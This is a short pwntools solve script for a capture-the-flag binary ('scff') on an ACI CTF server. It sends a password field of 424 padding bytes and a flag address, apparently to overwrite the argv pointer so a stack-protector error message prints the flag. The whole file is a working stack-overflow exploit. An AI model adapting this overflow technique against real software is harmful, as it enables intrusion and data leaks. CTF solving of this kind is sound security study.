#!/usr/bin/env python2

"""
./solve.py REMOTE HOST=docker.acictf.com PORT=33020
"""

from pwn import *

PROG_PATH = './scff'

LIBC_ARGV_OFFSET = 424
FLAG_ADDR = 0x602260


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def win(io):
    payload = ''
    payload += 'A' * LIBC_ARGV_OFFSET
    payload += p64(FLAG_ADDR)

    io.sendlineafter('\n\n', '1')
    io.sendlineafter('Account?\n', 'a')
    io.sendlineafter('Username?\n', 'a')
    io.sendlineafter('Password?\n', payload)

    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)

